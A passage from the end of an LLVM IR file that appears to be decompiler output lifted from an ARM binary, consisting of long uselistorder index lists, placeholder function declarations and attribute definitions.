1592, 618, 1593, 1594, 137, 1942, 1943, 394, 2256, 53, 520, 619, 395, 2257, 397, 396, 2258, 2259, 183, 2260, 2261, 399, 398, 2262, 2263, 2264, 400, 2265, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 2266, 630, 2267, 631, 2268, 632, 2269, 2270, 633, 2271, 521, 2272, 634, 635, 636, 2273, 2274, 2275, 54, 1732, 637, 1944, 1945, 1946, 1947, 1948, 479, 478, 477, 1949, 536, 1950, 1955, 1956, 93, 1951, 1952, 1953, 1954, 466, 638, 1957, 1958, 401, 1959, 94, 95, 402, 1960, 257, 1961, 1980, 403, 1981, 1982, 1983, 1984, 639, 1985, 70, 640, 1993, 480, 1986, 1987, 1988, 1989, 1990, 641, 642, 1991, 643, 644, 1992, 1994, 1995, 1996, 645, 1997, 1998, 206, 1999, 2000, 139, 138, 2001, 2002, 410, 2003, 2004, 198, 2005, 2006, 2007, 2013, 412, 258, 259, 411, 2014, 96, 168, 199, 246, 2015, 2016, 1309, 144, 145, 97, 2017, 2018, 98, 166, 167, 2019, 406, 407, 405, 404, 2020, 2021, 646, 2022, 2023, 413, 2024, 2025, 2026, 523, 184, 185, 522, 2027, 2028, 2029, 455, 2040, 2030, 2034, 2035, 2036, 2037, 2038, 2039, 2041, 2042, 2043, 2044, 2045, 186, 409, 2046, 187, 408, 2047, 2048, 2049, 2050, 2051, 481, 2011, 414, 2012, 415, 1447, 1448, 647, 1449, 648, 1450, 416, 417, 2031, 2032, 649, 2033, 2008, 2009, 2010, 418, 1676, 99, 100, 101, 102, 103, 419, 2052, 2053, 650, 2054, 2055, 2056, 2057, 651, 2058, 420, 652, 2059, 421, 2060, 2061, 2062, 653, 422, 2063, 2064, 654, 655, 656, 423, 657, 658, 659, 2065, 2066, 1595, 1596, 1597, 1598, 1599, 1600, 1601, 1602, 1603, 1604, 424, 1605, 425, 1606, 1607, 1608, 2067, 2068, 533, 524, 525, 2069, 2070, 2071, 2072, 2073, 2074, 2075, 2076, 660, 2077, 2078, 2079, 2080, 2081, 2082, 2083, 2085, 2084, 2086, 2087, 2088, 2089, 2090, 661, 2091, 2092, 2093, 2094, 2095, 2096, 662, 2097, 2098, 2099, 2100, 2101, 2102, 2103, 169, 247, 426, 2104, 2105, 2106, 2107, 2108, 2109, 427, 2110, 663, 2111, 2112, 2113, 2114, 664, 2115, 2116, 2117, 2118, 170, 2119, 2120, 2121, 2122, 2123, 2139, 2155, 665, 2156, 2157, 2158, 2159, 2160, 2161, 2162, 2163, 2164, 248, 2165, 2166, 2167, 2124, 2125, 2126, 2127, 666, 2128, 2129, 2130, 2131, 428, 2132, 2133, 667, 2134, 2135, 2136, 2137, 2138, 2140, 2141, 2142, 2143, 668, 2144, 2145, 2146, 2147, 429, 2148, 2149, 669, 2150, 2151, 2152, 2153, 2154, 1609, 1610, 1611, 188, 1612, 1613, 1614, 1615, 430, 670, 2426, 2427, 2428, 2429, 2430, 1310, 456, 2431, 55, 1962, 1963, 1964, 1965, 200, 1966, 431, 1967, 1968, 1969, 1970, 1971, 1972, 1973, 432, 1311, 1314, 1312, 1313, 1974, 1975, 1976, 1977, 1978, 1979, 672, 676, 1636, 1637, 104, 171, 671, 105, 457, 677, 1638, 1639, 106, 146, 674, 675, 107, 147, 678, 679, 1640, 673, 680, 1641, 681, 1642, 1643, 73, 74, 1644, 1646, 464, 1645, 1647, 71, 72, 1648, 684, 685, 682, 683, 1649, 693, 686, 689, 687, 690, 688, 691, 1650, 692, 694, 1651, 1652, 1653, 695, 1654, 249, 250, 1655, 108, 461, 460, 1656, 1657, 109, 459, 458, 1658, 110, 111, 112, 113, 114, 115, 116, 696, 1659, 697, 1660, 1661, 698, 699, 700, 1662, 1663, 701, 526, 1664, 1665, 1666, 1667, 1669, 117, 148, 1668, 527, 703, 704, 1674, 702, 1675, 705, 433, 707, 708, 709, 1677, 1678, 710, 1679, 711, 712, 1680, 706, 713, 1681, 1682, 714, 1725, 1726, 1727, 715, 1728, 1729, 118, 172, 173, 1730, 75, 76, 1731, 434, 119, 1733, 716, 2168, 2230, 2231, 537, 2232, 2233, 462, 717, 528, 529, 1451, 530, 531, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 915, 916, 917, 918, 919, 920, 921, 922, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 933, 934, 935, 936, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959, 960, 961, 962, 963, 964, 965, 966, 967, 968, 969, 970, 971, 972, 973, 974, 975, 976, 977, 978, 979, 980, 981, 982, 983, 984, 985, 986, 987, 988, 989, 990, 991, 992, 993, 994, 995, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 1016, 1017, 1018, 1019, 1020, 1021, 1022, 1023, 1024, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 1043, 1044, 1045, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 1053, 1054, 1055, 1056, 1057, 1058, 1059, 1060, 1061, 1062, 1063, 1064, 1065, 1066, 1067, 1068, 1069, 1070, 1071, 1072, 1073, 1074, 1075, 1076, 1077, 1078, 1079, 1080, 1081, 1082, 1083, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 1091, 1092, 1093, 1094, 1095, 1096, 1097, 1098, 1099, 1100, 1101, 1102, 1103, 1104, 1105, 1106, 1107, 1108, 1109, 1110, 1111, 1112, 1113, 1114, 1115, 1116, 1117, 1118, 1119, 1120, 1121, 1122, 1123, 1124, 1125, 1126, 1127, 1128, 1129, 1130, 1131, 1132, 1133, 1134, 1135, 1136, 1137, 1138, 1139, 1140, 1141, 1142, 1143, 1144, 1145, 1146, 1147, 1148, 1149, 1150, 1151, 1152, 1153, 1154, 1155, 1156, 1157, 1158, 1159, 1160, 1161, 1162, 1163, 1164, 1165, 1166, 1167, 1168, 1169, 1170, 1171, 1172, 1173, 1174, 1175, 1176, 1177, 1178, 1179, 1180, 1181, 1182, 1183, 1184, 1185, 1186, 1187, 1188, 1189, 1190, 1191, 1192, 1193, 1194, 1195, 1196, 1197, 1198, 1199, 1200, 1201, 1202, 1203, 1204, 1205, 1206, 1207, 1208, 1209, 1210, 1211, 1212, 1213, 1214, 1215, 1216, 1217, 1218, 1219, 1220, 1221, 1222, 1223, 1224, 1225, 1226, 1227, 1228, 1229, 1230, 1231, 1232, 1233, 1234, 1235, 1236, 1237, 1238, 1239, 1240, 1241, 1242, 1243, 1244, 1245, 1246, 1247, 1248, 1249, 1250, 1251, 1252, 1253, 1254, 1255, 1256, 1257, 1258, 1259, 2432, 2433, 2434, 2435, 2436, 2437, 2438, 2439, 2440, 2441, 2442, 2443, 2444, 2445, 2446 }
  uselistorder i32* @r0, { 145, 18, 19, 340, 20, 21, 237, 238, 22, 168, 146, 147, 164, 165, 166, 167, 23, 16, 148, 86, 149, 5, 87, 150, 151, 85, 88, 152, 24, 17, 169, 170, 171, 172, 153, 25, 154, 155, 26, 27, 156, 157, 158, 159, 160, 161, 13, 162, 163, 28, 173, 76, 174, 175, 29, 30, 177, 176, 14, 310, 313, 316, 317, 77, 129, 130, 78, 131, 132, 79, 133, 80, 134, 81, 135, 136, 315, 314, 139, 138, 4, 239, 240, 241, 244, 120, 321, 31, 121, 186, 187, 32, 242, 243, 33, 322, 323, 324, 325, 34, 10, 11, 326, 327, 6, 328, 318, 319, 35, 178, 312, 117, 36, 219, 220, 37, 221, 222, 95, 223, 224, 38, 39, 329, 140, 141, 142, 143, 144, 330, 331, 332, 245, 246, 40, 341, 247, 343, 344, 342, 137, 7, 119, 58, 59, 188, 0, 41, 42, 61, 333, 43, 44, 45, 118, 311, 46, 96, 225, 47, 48, 49, 50, 248, 51, 345, 346, 347, 348, 349, 350, 249, 15, 8, 53, 189, 97, 226, 250, 227, 12, 228, 229, 230, 231, 54, 55, 179, 180, 82, 181, 56, 251, 252, 57, 122, 334, 52, 128, 93, 99, 123, 335, 336, 337, 124, 338, 1, 98, 235, 71, 100, 125, 60, 126, 253, 70, 256, 254, 257, 258, 259, 260, 261, 262, 263, 62, 264, 127, 255, 265, 266, 268, 269, 270, 271, 272, 273, 274, 267, 275, 276, 63, 287, 307, 101, 64, 94, 288, 65, 66, 277, 67, 182, 183, 184, 185, 68, 102, 278, 279, 280, 103, 281, 282, 104, 283, 284, 105, 106, 285, 286, 107, 289, 290, 108, 9, 291, 109, 292, 293, 114, 305, 115, 116, 306, 294, 110, 295, 296, 297, 298, 111, 2, 299, 300, 112, 301, 302, 303, 113, 3, 304, 83, 69, 75, 351, 352, 353, 84, 354, 355, 72, 73, 190, 191, 89, 90, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 91, 209, 92, 210, 74, 211, 212, 213, 214, 215, 216, 217, 218, 232, 233, 234, 236, 308, 309, 320, 339 }
}

declare i32 @unknown_ffff0fc0() local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i16 @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8** @__decompiler_undefined_function_4() local_unnamed_addr

declare i16* @__decompiler_undefined_function_5() local_unnamed_addr

declare i64 @__decompiler_undefined_function_6() local_unnamed_addr

declare %vfp_regs @__decompiler_undefined_function_7() local_unnamed_addr

declare %anon_struct_6 @__decompiler_undefined_function_8() local_unnamed_addr

declare %anon_struct_15.3 @__decompiler_undefined_function_9() local_unnamed_addr

declare %anon_struct_15 @__decompiler_undefined_function_10() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #2

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
attributes #2 = { noreturn nounwind }
